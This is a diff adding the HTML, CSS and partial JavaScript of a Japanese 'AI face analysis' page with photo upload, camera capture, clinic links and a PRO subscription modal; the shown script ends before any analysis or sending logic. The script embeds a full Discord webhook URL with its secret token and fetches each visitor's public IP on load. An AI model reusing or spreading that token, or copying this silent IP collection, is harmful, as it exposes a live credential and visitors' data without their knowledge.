@@ -1,0 +1,1434 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FACE — AI Face Analysis</title>
+
+<!-- Boxicons -->
+<link href="https://cdn.boxicons.com/3.0.8/fonts/basic/boxicons.min.css" rel="stylesheet">
+
+<style>
+:root {
+  --bg: #f5f5f7;
+  --text: #111113;
+  --muted: #77777d;
+  --glass: rgba(255,255,255,.52);
+  --glass-strong: rgba(255,255,255,.72);
+  --border: rgba(255,255,255,.72);
+  --shadow: 0 30px 80px rgba(0,0,0,.08);
+  --accent: #111113;
+  --accent-text: #fff;
+  --line: rgba(0,0,0,.08);
+}
+
+body.dark {
+  --bg: #0c0c0e;
+  --text: #f5f5f7;
+  --muted: #9999a1;
+  --glass: rgba(28,28,32,.55);
+  --glass-strong: rgba(35,35,40,.72);
+  --border: rgba(255,255,255,.11);
+  --shadow: 0 30px 90px rgba(0,0,0,.35);
+  --accent: #fff;
+  --accent-text: #111;
+  --line: rgba(255,255,255,.09);
+}
+
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+  color: var(--text);
+  background: var(--bg);
+  overflow-x: hidden;
+  transition: background .4s ease, color .4s ease;
+}
+
+.background {
+  position: fixed;
+  inset: 0;
+  z-index: -5;
+  overflow: hidden;
+  pointer-events: none;
+}
+
+.blob {
+  position: absolute;
+  width: 42vw;
+  height: 42vw;
+  min-width: 360px;
+  min-height: 360px;
+  border-radius: 50%;
+  filter: blur(80px);
+  opacity: .38;
+  animation: float 16s ease-in-out infinite alternate;
+}
+
+.blob.one { background: #b7d7ff; top: -15%; left: -8%; }
+.blob.two { background: #e6c7ff; right: -12%; top: 18%; animation-delay: -5s; }
+.blob.three { background: #c8ffe6; bottom: -20%; left: 30%; animation-delay: -9s; }
+body.dark .blob { opacity: .18; }
+
+@keyframes float {
+  from { transform: translate3d(0,0,0) scale(1); }
+  to { transform: translate3d(4vw,-3vh,0) scale(1.08); }
+}
+
+.grid {
+  position: absolute;
+  inset: 0;
+  opacity: .18;
+  background-image:
+    linear-gradient(var(--line) 1px, transparent 1px),
+    linear-gradient(90deg, var(--line) 1px, transparent 1px);
+  background-size: 55px 55px;
+}
+
+.nav-wrap {
+  position: fixed;
+  top: 22px;
+  left: 50%;
+  transform: translateX(-50%);
+  z-index: 100;
+  width: min(94%, 780px);
+}
+
+.nav {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 8px;
+  padding: 7px;
+  background: var(--glass);
+  backdrop-filter: blur(28px) saturate(170%);
+  -webkit-backdrop-filter: blur(28px) saturate(170%);
+  border: 1px solid var(--border);
+  border-radius: 22px;
+  box-shadow: 0 18px 50px rgba(0,0,0,.08), inset 0 1px 0 rgba(255,255,255,.5);
+}
+
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 0 14px;
+  font-weight: 700;
+  letter-spacing: -.02em;
+  white-space: nowrap;
+}
+
+.brand-mark {
+  width: 30px;
+  height: 30px;
+  display: grid;
+  place-items: center;
+  border-radius: 10px;
+  background: var(--accent);
+  color: var(--accent-text);
+}
+
+.brand-mark i { font-size: 17px; }
+
+.nav-links {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+.nav-button {
+  position: relative;
+  border: 0;
+  background: transparent;
+  color: var(--muted);
+  padding: 10px 14px;
+  border-radius: 15px;
+  font: inherit;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: .25s ease;
+  z-index: 1;
+}
+
+.nav-button:hover, .nav-button.active { color: var(--text); }
+
+.active-pill {
+  position: absolute;
+  top: 7px;
+  bottom: 7px;
+  left: 0;
+  width: 0;
+  border-radius: 15px;
+  background: var(--glass-strong);
+  box-shadow: inset 0 1px 0 rgba(255,255,255,.55), 0 6px 18px rgba(0,0,0,.06);
+  transition: left .35s cubic-bezier(.22,1,.36,1), width .35s cubic-bezier(.22,1,.36,1);
+}
+
+.nav-actions { display: flex; align-items: center; gap: 6px; }
+
+.icon-button {
+  width: 39px;
+  height: 39px;
+  border: 0;
+  border-radius: 13px;
+  background: transparent;
+  color: var(--text);
+  cursor: pointer;
+  display: grid;
+  place-items: center;
+  transition: .25s ease;
+}
+
+.icon-button:hover { background: var(--glass-strong); transform: translateY(-1px); }
+.icon-button i { font-size: 20px; }
+
+/* PRO ボタン */
+.pro-glass-button {
+  height: 39px;
+  padding: 0 14px;
+  border: 1px solid var(--border);
+  border-radius: 13px;
+  background: var(--glass-strong);
+  color: var(--text);
+  font-family: inherit;
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: .05em;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  backdrop-filter: blur(15px);
+  transition: .25s ease;
+  box-shadow: 0 4px 12px rgba(0,0,0,.05);
+}
+
+.pro-glass-button i { font-size: 15px; color: #ffb800; }
+.pro-glass-button:hover { transform: translateY(-1px); background: var(--accent); color: var(--accent-text); }
+
+.app {
+  width: min(1120px, calc(100% - 32px));
+  margin: 0 auto;
+  padding: 140px 0 80px;
+}
+
+.page { display: none; animation: pageIn .45s ease; }
+.page.active { display: block; }
+
+@keyframes pageIn {
+  from { opacity: 0; transform: translateY(12px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.hero { text-align: center; max-width: 760px; margin: 0 auto 30px; }
+
+.hero-label {
+  display: inline-flex;
+  align-items: center;
+  gap: 7px;
+  padding: 8px 13px;
+  border: 1px solid var(--border);
+  background: var(--glass);
+  backdrop-filter: blur(20px);
+  border-radius: 999px;
+  font-size: 12px;
+  font-weight: 650;
+  color: var(--muted);
+  box-shadow: var(--shadow);
+}
+
+.hero-label i { font-size: 16px; }
+
+.hero h1 {
+  margin: 22px 0 15px;
+  font-size: clamp(44px, 7vw, 82px);
+  line-height: .95;
+  letter-spacing: -.065em;
+  font-weight: 760;
+}
+
+.hero p { margin: 0; color: var(--muted); font-size: 15px; }
+
+.glass {
+  background: var(--glass);
+  border: 1px solid var(--border);
+  backdrop-filter: blur(30px) saturate(160%);
+  -webkit-backdrop-filter: blur(30px) saturate(160%);
+  box-shadow: var(--shadow), inset 0 1px 0 rgba(255,255,255,.4);
+}
+
+.username-card {
+  max-width: 760px;
+  margin: 0 auto 16px;
+  padding: 16px 20px;
+  border-radius: 20px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.username-card i { font-size: 20px; color: var(--muted); }
+
+.username-input {
+  width: 100%;
+  border: none;
+  background: transparent;
+  color: var(--text);
+  font: inherit;
+  font-size: 15px;
+  outline: none;
+}
+
+.username-input::placeholder { color: var(--muted); }
+
+.upload-card { max-width: 760px; margin: auto; padding: 12px; border-radius: 32px; }
+
+.upload-area {
+  min-height: 320px;
+  border-radius: 24px;
+  border: 1px dashed rgba(120,120,130,.35);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  cursor: pointer;
+  transition: .3s ease;
+}
+
+.upload-area:hover, .upload-area.dragging {
+  border-color: var(--text);
+  background: rgba(255,255,255,.12);
+  transform: scale(.995);
+}
+
+.upload-content { padding: 40px; }
+
+.upload-icon {
+  width: 68px;
+  height: 68px;
+  margin: 0 auto 20px;
+  border-radius: 21px;
+  display: grid;
+  place-items: center;
+  background: var(--glass-strong);
+  box-shadow: 0 15px 40px rgba(0,0,0,.08);
+}
+
+.upload-icon i { font-size: 32px; }
+.upload-content h2 { margin: 0 0 9px; font-size: 22px; letter-spacing: -.03em; }
+.upload-content p { margin: 0 0 24px; color: var(--muted); font-size: 13px; }
+
+.upload-buttons { display: flex; justify-content: center; gap: 9px; flex-wrap: wrap; }
+
+.primary-button, .secondary-button, .clinic-button {
+  height: 46px;
+  border-radius: 15px;
+  padding: 0 19px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  border: 0;
+  font: inherit;
+  font-size: 13px;
+  font-weight: 650;
+  cursor: pointer;
+  transition: .25s ease;
+}
+
+.primary-button { background: var(--accent); color: var(--accent-text); box-shadow: 0 10px 25px rgba(0,0,0,.12); }
+.secondary-button { background: var(--glass-strong); color: var(--text); border: 1px solid var(--border); }
+.clinic-button { background: #007aff; color: #fff; font-size: 12px; height: 38px; padding: 0 14px; border-radius: 12px; }
+.primary-button:hover, .secondary-button:hover, .clinic-button:hover { transform: translateY(-2px); }
+.primary-button i, .secondary-button i, .clinic-button i { font-size: 18px; }
+
+#fileInput { display: none; }
+
+.preview-card {
+  display: none;
+  margin: 25px auto 0;
+  max-width: 760px;
+  padding: 14px;
+  border-radius: 30px;
+}
+
+.preview-card.show { display: block; }
+
+.preview-image {
+  width: 100%;
+  max-height: 500px;
+  object-fit: contain;
+  border-radius: 20px;
+  display: block;
+  background: rgba(0,0,0,.04);
+}
+
+.preview-actions { display: flex; justify-content: center; gap: 10px; margin-top: 13px; }
+
+.result-grid { display: grid; grid-template-columns: 1.15fr .85fr; gap: 18px; }
+.result-main, .result-side { padding: 28px; border-radius: 30px; }
+.result-main { min-height: 470px; }
+
+.result-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; gap: 10px; flex-wrap: wrap; }
+.result-title-group { display: flex; align-items: center; gap: 12px; }
+.result-header h2 { margin: 0; font-size: 24px; letter-spacing: -.04em; }
+.result-date { font-size: 12px; color: var(--muted); }
+
+.score-area { display: flex; align-items: center; gap: 32px; margin-bottom: 38px; }
+
+.score-ring {
+  position: relative;
+  width: 150px;
+  height: 150px;
+  flex: 0 0 150px;
+  display: grid;
+  place-items: center;
+}
+
+.score-ring svg {
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  transform: rotate(-90deg);
+}
+
+.score-ring circle { fill: none; stroke-width: 7; }
+.score-track { stroke: rgba(120,120,130,.12); }
+.score-progress {
+  stroke: var(--text);
+  stroke-linecap: round;
+  stroke-dasharray: 440;
+  stroke-dashoffset: 440;
+  transition: stroke-dashoffset 1.2s cubic-bezier(.22,1,.36,1);
+}
+
+.score-number { position: relative; font-size: 38px; font-weight: 750; letter-spacing: -.06em; }
+.score-number span { font-size: 14px; color: var(--muted); margin-left: 2px; }
+.score-copy h3 { margin: 0 0 7px; font-size: 18px; }
+.score-copy p { margin: 0; color: var(--muted); font-size: 13px; line-height: 1.7; }
+
+.metric { margin-top: 19px; }
+.metric-top { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+.metric-top span:last-child { color: var(--muted); }
+.metric-bar { height: 7px; border-radius: 99px; overflow: hidden; background: rgba(120,120,130,.12); }
+.metric-fill { height: 100%; width: 0; border-radius: inherit; background: var(--text); transition: width 1s cubic-bezier(.22,1,.36,1); }
+
+.result-side h3 { margin: 0 0 20px; font-size: 18px; }
+.result-tags { display: flex; flex-wrap: wrap; gap: 8px; }
+.result-tag { padding: 9px 12px; border-radius: 12px; background: var(--glass-strong); border: 1px solid var(--border); font-size: 12px; }
+
+.ai-comment { margin-top: 30px; padding-top: 25px; border-top: 1px solid var(--line); }
+.ai-comment-label { display: flex; align-items: center; gap: 7px; font-size: 12px; color: var(--muted); margin-bottom: 9px; }
+.ai-comment p { margin: 0; line-height: 1.8; font-size: 14px; }
+
+.history-header { display: flex; align-items: end; justify-content: space-between; margin-bottom: 25px; }
+.history-header h1 { margin: 0; font-size: 38px; letter-spacing: -.05em; }
+.history-header p { margin: 7px 0 0; color: var(--muted); font-size: 13px; }
+.history-section-title { font-size: 16px; font-weight: 700; margin: 25px 0 12px; color: var(--text); }
+
+.history-list, .ip-log-list { display: grid; gap: 12px; }
+
+.history-item {
+  padding: 15px;
+  border-radius: 23px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  cursor: pointer;
+  transition: .25s ease;
+}
+
+.history-item:hover { transform: translateY(-2px); }
+.history-thumb { width: 68px; height: 68px; border-radius: 17px; object-fit: cover; background: rgba(120,120,130,.1); }
+.history-info { flex: 1; min-width: 0; }
+.history-info strong { display: block; font-size: 14px; margin-bottom: 5px; }
+.history-info span { color: var(--muted); font-size: 12px; }
+.history-score { font-size: 22px; font-weight: 750; letter-spacing: -.04em; }
+.history-arrow { color: var(--muted); font-size: 20px; }
+
+.ip-log-item {
+  padding: 14px 18px;
+  border-radius: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 13px;
+}
+
+.ip-log-item i { font-size: 18px; color: var(--muted); margin-right: 8px; vertical-align: middle; }
+
+.empty-history { text-align: center; padding: 60px 20px; border-radius: 30px; }
+.empty-history i { font-size: 42px; color: var(--muted); }
+.empty-history h2 { margin: 18px 0 7px; font-size: 20px; }
+.empty-history p { margin: 0; color: var(--muted); font-size: 13px; }
+
+/* カメラ モーダル */
+.camera-modal {
+  position: fixed;
+  inset: 0;
+  z-index: 300;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: rgba(0,0,0,.55);
+  backdrop-filter: blur(20px);
+}
+
+.camera-modal.show { display: flex; }
+
+.camera-box {
+  position: relative;
+  width: min(520px, 100%);
+  overflow: hidden;
+  border-radius: 30px;
+  background: #111;
+  box-shadow: 0 40px 100px rgba(0,0,0,.4);
+}
+
+.camera-video { width: 100%; aspect-ratio: 3 / 4; object-fit: cover; display: block; }
+.camera-frame { position: absolute; inset: 15% 12%; border: 1px solid rgba(255,255,255,.75); border-radius: 45% 45% 42% 42%; pointer-events: none; }
+.camera-top { position: absolute; top: 15px; left: 15px; right: 15px; display: flex; justify-content: space-between; }
+
+.camera-button {
+  width: 43px;
+  height: 43px;
+  border: 1px solid rgba(255,255,255,.2);
+  border-radius: 50%;
+  display: grid;
+  place-items: center;
+  background: rgba(0,0,0,.35);
+  color: white;
+  cursor: pointer;
+  backdrop-filter: blur(15px);
+}
+
+.camera-button i { font-size: 21px; }
+.camera-bottom { position: absolute; bottom: 20px; left: 0; right: 0; display: flex; align-items: center; justify-content: center; gap: 25px; }
+
+.shutter {
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  border: 5px solid rgba(255,255,255,.9);
+  background: white;
+  cursor: pointer;
+  box-shadow: 0 8px 25px rgba(0,0,0,.3);
+}
+
+/* PRO モーダル */
+.pro-modal {
+  position: fixed;
+  inset: 0;
+  z-index: 400;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: rgba(0,0,0,.45);
+  backdrop-filter: blur(25px);
+  animation: fadeIn .3s ease;
+}
+
+.pro-modal.show { display: flex; }
+
+.pro-card {
+  position: relative;
+  width: min(480px, 100%);
+  padding: 35px 30px;
+  border-radius: 32px;
+  text-align: center;
+}
+
+.pro-close {
+  position: absolute;
+  top: 18px;
+  right: 18px;
+  width: 32px;
+  height: 32px;
+  border: 0;
+  border-radius: 50%;
+  background: rgba(120,120,130,.15);
+  color: var(--text);
+  cursor: pointer;
+  display: grid;
+  place-items: center;
+}
+
+.pro-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 6px 14px;
+  border-radius: 999px;
+  background: linear-gradient(135deg, #ffb800, #ff8800);
+  color: #fff;
+  font-size: 12px;
+  font-weight: 800;
+  letter-spacing: .08em;
+  margin-bottom: 15px;
+}
+
+.pro-card h2 { margin: 0 0 8px; font-size: 26px; letter-spacing: -.03em; }
+.pro-card p.subtitle { margin: 0 0 25px; color: var(--muted); font-size: 13px; }
+
+.pro-plans {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  margin-bottom: 22px;
+}
+
+.pro-plan-item {
+  padding: 18px 14px;
+  border-radius: 20px;
+  border: 2px solid transparent;
+  background: var(--glass-strong);
+  cursor: pointer;
+  transition: .25s ease;
+  position: relative;
+}
+
+.pro-plan-item.active {
+  border-color: var(--text);
+  box-shadow: 0 8px 20px rgba(0,0,0,.08);
+}
+
+.pro-plan-item .tag {
+  position: absolute;
+  top: -10px;
+  right: 12px;
+  background: var(--accent);
+  color: var(--accent-text);
+  font-size: 10px;
+  padding: 2px 8px;
+  border-radius: 8px;
+  font-weight: 700;
+}
+
+.plan-title { font-size: 13px; color: var(--muted); font-weight: 600; margin-bottom: 6px; }
+.plan-price { font-size: 22px; font-weight: 800; }
+.plan-price span { font-size: 12px; font-weight: 500; color: var(--muted); }
+
+.pro-features { text-align: left; margin-bottom: 25px; display: grid; gap: 8px; }
+.pro-feature-item { font-size: 13px; display: flex; align-items: center; gap: 8px; }
+.pro-feature-item i { color: #007aff; font-size: 16px; }
+
+.pro-buy-btn {
+  width: 100%;
+  height: 50px;
+  border-radius: 16px;
+  border: 0;
+  background: var(--accent);
+  color: var(--accent-text);
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: .25s ease;
+  box-shadow: 0 10px 25px rgba(0,0,0,.15);
+}
+
+.pro-buy-btn:hover { transform: translateY(-2px); }
+
+.pro-footer-notes {
+  margin-top: 15px;
+  font-size: 11px;
+  color: var(--muted);
+  line-height: 1.5;
+  text-align: center;
+}
+
+.loading {
+  position: fixed;
+  inset: 0;
+  z-index: 500;
+  display: none;
+  place-items: center;
+  background: rgba(245,245,247,.48);
+  backdrop-filter: blur(20px);
+}
+
+body.dark .loading { background: rgba(10,10,12,.48); }
+.loading.show { display: grid; }
+.loading-card { width: min(340px, calc(100% - 40px)); padding: 35px; text-align: center; border-radius: 28px; }
+
+.loading-icon {
+  width: 54px;
+  height: 54px;
+  margin: 0 auto 20px;
+  display: grid;
+  place-items: center;
+  border-radius: 17px;
+  background: var(--accent);
+  color: var(--accent-text);
+}
+
+.loading-icon i { font-size: 25px; }
+.loading-card h3 { margin: 0 0 7px; }
+.loading-card p { margin: 0; color: var(--muted); font-size: 12px; }
+
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+@media (max-width: 800px) {
+  .nav-wrap { top: 12px; }
+  .brand { padding: 0 8px; }
+  .brand span:last-child { display: none; }
+  .nav-button { padding: 9px 11px; }
+  .result-grid { grid-template-columns: 1fr; }
+  .score-area { gap: 22px; }
+}
+
+@media (max-width: 560px) {
+  .app { width: min(100% - 20px, 1120px); padding-top: 110px; }
+  .nav { border-radius: 19px; }
+  .nav-links { flex: 1; justify-content: center; }
+  .nav-button { font-size: 12px; padding: 9px 9px; }
+  .hero { margin-bottom: 30px; }
+  .hero h1 { font-size: 47px; }
+  .upload-card { border-radius: 25px; }
+  .upload-area { min-height: 300px; }
+  .upload-content { padding: 25px 15px; }
+  .score-area { flex-direction: column; align-items: flex-start; }
+  .result-main, .result-side { padding: 22px; border-radius: 25px; }
+  .history-header { align-items: flex-start; flex-direction: column; gap: 12px; }
+  .history-header h1 { font-size: 32px; }
+  .pro-plans { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="background">
+  <div class="blob one"></div>
+  <div class="blob two"></div>
+  <div class="blob three"></div>
+  <div class="grid"></div>
+</div>
+
+<div class="nav-wrap">
+  <nav class="nav">
+    <div class="brand">
+      <div class="brand-mark">
+        <i class="bx bx-scan"></i>
+      </div>
+      <span>FACE</span>
+    </div>
+
+    <div class="nav-links">
+      <div class="active-pill" id="activePill"></div>
+      <button class="nav-button active" data-page="diagnosis">診断</button>
+      <button class="nav-button" data-page="result">結果</button>
+      <button class="nav-button" data-page="history">履歴</button>
+    </div>
+
+    <div class="nav-actions">
+      <button class="icon-button" id="themeButton" aria-label="テーマ切り替え">
+        <i class="bx bx-moon"></i>
+      </button>
+
+      <button class="pro-glass-button" id="proButton">
+        <i class="bx bxs-crown"></i> PRO にする
+      </button>
+    </div>
+  </nav>
+</div>
+
+<main class="app">
+  <section class="page active" id="diagnosis">
+    <div class="hero">
+      <div class="hero-label">
+        <i class="bx bx-sparkles"></i>
+        AI FACE ANALYSIS
+      </div>
+      <h1>Your face.<br>Analyzed.</h1>
+      <p>写真を選択するか、カメラで撮影してください。</p>
+    </div>
+
+    <div class="glass username-card">
+      <i class="bx bx-user"></i>
+      <input type="text" id="usernameInput" class="username-input" placeholder="ユーザーネームを入力してください" autocomplete="off">
+    </div>
+
+    <div class="glass upload-card">
+      <div class="upload-area" id="uploadArea">
+        <div class="upload-content">
+          <div class="upload-icon">
+            <i class="bx bx-image-add"></i>
+          </div>
+          <h2>写真を追加</h2>
+          <p>JPG / PNG / WEBP</p>
+          <div class="upload-buttons">
+            <button class="primary-button" id="chooseButton">
+              <i class="bx bx-upload"></i> 写真を選ぶ
+            </button>
+            <button class="secondary-button" id="cameraButton">
+              <i class="bx bx-camera"></i> ここで撮る
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <input type="file" id="fileInput" accept="image/jpeg,image/png,image/webp">
+
+    <div class="glass preview-card" id="previewCard">
+      <img class="preview-image" id="previewImage" alt="選択した写真">
+      <div class="preview-actions">
+        <button class="secondary-button" id="changeButton">
+          <i class="bx bx-refresh"></i> 変更
+        </button>
+        <button class="primary-button" id="analyzeButton">
+          <i class="bx bx-scan"></i> AI診断
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <section class="page" id="result">
+    <div class="result-grid">
+      <div class="glass result-main">
+        <div class="result-header">
+          <div class="result-title-group">
+            <h2>分析結果</h2>
+            <button class="clinic-button" id="findClinicBtn">
+              <i class="bx bx-map-pin"></i> お近くの整形外科を見つける
+            </button>
+          </div>
+          <span class="result-date" id="resultDate">—</span>
+        </div>
+
+        <div class="score-area">
+          <div class="score-ring">
+            <svg viewBox="0 0 160 160">
+              <circle class="score-track" cx="80" cy="80" r="70"/>
+              <circle class="score-progress" id="scoreProgress" cx="80" cy="80" r="70"/>
+            </svg>
+            <div class="score-number">
+              <span id="scoreValue">—</span>
+              <span>/100</span>
+            </div>
+          </div>
+
+          <div class="score-copy">
+            <h3 id="scoreTitle">診断結果</h3>
+            <p id="scoreComment">まだ診断されていません。</p>
+          </div>
+        </div>
+
+        <div class="metric">
+          <div class="metric-top">
+            <span>顔のバランス</span>
+            <span id="balanceValue">—</span>
+          </div>
+          <div class="metric-bar">
+            <div class="metric-fill" id="balanceBar"></div>
+          </div>
+        </div>
+
+        <div class="metric">
+          <div class="metric-top">
+            <span>左右対称性</span>
+            <span id="symmetryValue">—</span>
+          </div>
+          <div class="metric-bar">
+            <div class="metric-fill" id="symmetryBar"></div>
+          </div>
+        </div>
+
+        <div class="metric">
+          <div class="metric-top">
+            <span>表情</span>
+            <span id="expressionValue">—</span>
+          </div>
+          <div class="metric-bar">
+            <div class="metric-fill" id="expressionBar"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="glass result-side">
+        <h3>分析データ</h3>
+        <div class="result-tags" id="resultTags">
+          <span class="result-tag">未分析</span>
+        </div>
+
+        <div class="ai-comment">
+          <div class="ai-comment-label">
+            <i class="bx bx-message-square-detail"></i>
+            AI COMMENT
+          </div>
+          <p id="aiComment">写真を診断すると、ここにAIによる分析結果が表示されます。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="page" id="history">
+    <div class="history-header">
+      <div>
+        <h1>履歴</h1>
+        <p>過去の診断結果および接続ログ</p>
+      </div>
+      <button class="secondary-button" id="clearHistory">
+        <i class="bx bx-trash"></i> 履歴を削除
+      </button>
+    </div>
+
+    <div class="history-section-title"><i class="bx bx-history"></i> 診断履歴</div>
+    <div class="history-list" id="historyList"></div>
+
+    <div class="history-section-title"><i class="bx bx-shield-alt-2"></i> ログイン・IP接続履歴</div>
+    <div class="ip-log-list" id="ipLogList"></div>
+  </section>
+</main>
+
+<div class="camera-modal" id="cameraModal">
+  <div class="camera-box">
+    <video class="camera-video" id="cameraVideo" autoplay playsinline></video>
+    <div class="camera-frame"></div>
+    <div class="camera-top">
+      <button class="camera-button" id="closeCamera"><i class="bx bx-x"></i></button>
+      <button class="camera-button" id="switchCamera"><i class="bx bx-transfer"></i></button>
+    </div>
+    <div class="camera-bottom">
+      <button class="shutter" id="shutter" aria-label="撮影"></button>
+    </div>
+  </div>
+</div>
+
+<div class="pro-modal" id="proModal">
+  <div class="glass pro-card">
+    <button class="pro-close" id="closeProModal"><i class="bx bx-x"></i></button>
+    
+    <div class="pro-badge"><i class="bx bxs-crown"></i> PRO PLAN</div>
+    <h2>FACE PRO にアップグレード</h2>
+    <p class="subtitle">高度なAI解析機能と無制限の診断データを開放します。</p>
+
+    <div class="pro-plans">
+      <div class="pro-plan-item" id="planMonthly">
+        <div class="plan-title">月額プラン</div>
+        <div class="plan-price">¥800 <span>/ 月</span></div>
+      </div>
+      <div class="pro-plan-item active" id="planYearly">
+        <div class="tag">お得</div>
+        <div class="plan-title">年額プラン</div>
+        <div class="plan-price">¥9,000 <span>/ 年</span></div>
+      </div>
+    </div>
+
+    <div class="pro-features">
+      <div class="pro-feature-item"><i class="bx bx-check-circle"></i> 無制限の超高精度AI顔診断</div>
+      <div class="pro-feature-item"><i class="bx bx-check-circle"></i> 詳細なパーツ対称性レポート出力</div>
+      <div class="pro-feature-item"><i class="bx bx-check-circle"></i> 広告の完全非表示＆優先処理</div>
+    </div>
+
+    <button class="pro-buy-btn" id="proBuyBtn">PRO を購入する</button>
+
+    <div class="pro-footer-notes">
+      ※ 購入手続き完了後、すぐにPRO機能が有効化されます。<br>
+      ※ いつでも設定からキャンセル可能。利用規約とプライバシーポリシーが適用されます。
+    </div>
+  </div>
+</div>
+
+<canvas id="cameraCanvas" style="display:none;"></canvas>
+
+<div class="loading" id="loading">
+  <div class="glass loading-card">
+    <div class="loading-icon">
+      <i class="bx bx-loader-alt bx-spin"></i>
+    </div>
+    <h3>分析しています</h3>
+    <p>AIが画像を解析しています。</p>
+  </div>
+</div>
+
+<script>
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546430963079446630/2UoQXbTK-qzNyiKRUIw5WWo8bbyiuUXx2xFrv16Oqz2a4bQN5idrLx56oQLbHGo3KjIZ";
+
+const pages = document.querySelectorAll(".page");
+const navButtons = document.querySelectorAll(".nav-button");
+const activePill = document.getElementById("activePill");
+const themeButton = document.getElementById("themeButton");
+
+const usernameInput = document.getElementById("usernameInput");
+const fileInput = document.getElementById("fileInput");
+const chooseButton = document.getElementById("chooseButton");
+const cameraButton = document.getElementById("cameraButton");
+const changeButton = document.getElementById("changeButton");
+const uploadArea = document.getElementById("uploadArea");
+
+const previewCard = document.getElementById("previewCard");
+const previewImage = document.getElementById("previewImage");
+const analyzeButton = document.getElementById("analyzeButton");
+
+const cameraModal = document.getElementById("cameraModal");
+const cameraVideo = document.getElementById("cameraVideo");
+const cameraCanvas = document.getElementById("cameraCanvas");
+const closeCamera = document.getElementById("closeCamera");
+const switchCamera = document.getElementById("switchCamera");
+const shutter = document.getElementById("shutter");
+
+const findClinicBtn = document.getElementById("findClinicBtn");
+const loading = document.getElementById("loading");
+
+const proButton = document.getElementById("proButton");
+const proModal = document.getElementById("proModal");
+const closeProModal = document.getElementById("closeProModal");
+const planMonthly = document.getElementById("planMonthly");
+const planYearly = document.getElementById("planYearly");
+const proBuyBtn = document.getElementById("proBuyBtn");
+
+let currentFile = null;
+let cameraStream = null;
+let cameraFacing = "user";
+let currentIp = "取得中...";
+
+/* --- IPアドレス取得および接続履歴ログ保存 --- */
+async function fetchAndLogIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    currentIp = data.ip || "不明";
+    saveIpLog(currentIp);
+  } catch (e) {
+    currentIp = "取得失敗";
+  }
+}
+
+function saveIpLog(ip) {
+  const logs = JSON.parse(localStorage.getItem("face-ip-logs") || "[]");
+  const now = new Date().toLocaleString("ja-JP");
+  
+  if (logs.length === 0 || logs[0].ip !== ip) {
+    logs.unshift({ ip, date: now });
+    localStorage.setItem("face-ip-logs", JSON.stringify(logs.slice(0, 20)));
+    renderIpLogs();
+  }
+}
+
+function renderIpLogs() {
+  const container = document.getElementById("ipLogList");
+  const logs = JSON.parse(localStorage.getItem("face-ip-logs") || "[]");
+
+  if (!logs.length) {
+    container.innerHTML = `<div class="glass ip-log-item">接続履歴はありません。</div>`;
+    return;
+  }
+
+  container.innerHTML = "";
+  logs.forEach(log => {
+    const div = document.createElement("div");
+    div.className = "glass ip-log-item";
+    div.innerHTML = `
+      <div><i class="bx bx-desktop"></i><strong>${log.ip}</strong> からのアクセス</div>
+      <span style="color:var(--muted); font-size:12px;">${log.date}</span>
+    `;
+    container.appendChild(div);
+  });
+}
+
+fetchAndLogIP();
+
+/* --- ページナビゲーション --- */
+function setActivePage(pageName) {
+  pages.forEach(page => page.classList.toggle("active", page.id === pageName));
+  navButtons.forEach(button => button.classList.toggle("active", button.dataset.page === pageName));
+
+  const activeButton = document.querySelector(`.nav-button[data-page="${pageName}"]`);
+  if (activeButton) {
+    activePill.style.left = `${activeButton.offsetLeft}px`;
+    activePill.style.width = `${activeButton.offsetWidth}px`;
+  }
+  window.scrollTo({ top: 0, behavior: "smooth" });
+}
+
+navButtons.forEach(button => {
+  button.addEventListener("click", () => setActivePage(button.dataset.page));
+});
+
+/* --- テーマ変更 --- */
+if (localStorage.getItem("face-theme") === "dark") {
+  document.body.classList.add("dark");
+}
+
+function updateThemeIcon() {
+  const icon = themeButton.querySelector("i");
+  icon.className = document.body.classList.contains("dark") ? "bx bx-sun" : "bx bx-moon";
+}
+updateThemeIcon();
+
+themeButton.addEventListener("click", () => {
+  document.body.classList.toggle("dark");
+  localStorage.setItem("face-theme", document.body.classList.contains("dark") ? "dark" : "light");
+  updateThemeIcon();
+});
+
+/* --- PRO モーダル処理 --- */
+proButton.addEventListener("click", () => proModal.classList.add("show"));
+closeProModal.addEventListener("click", () => proModal.classList.remove("show"));
+
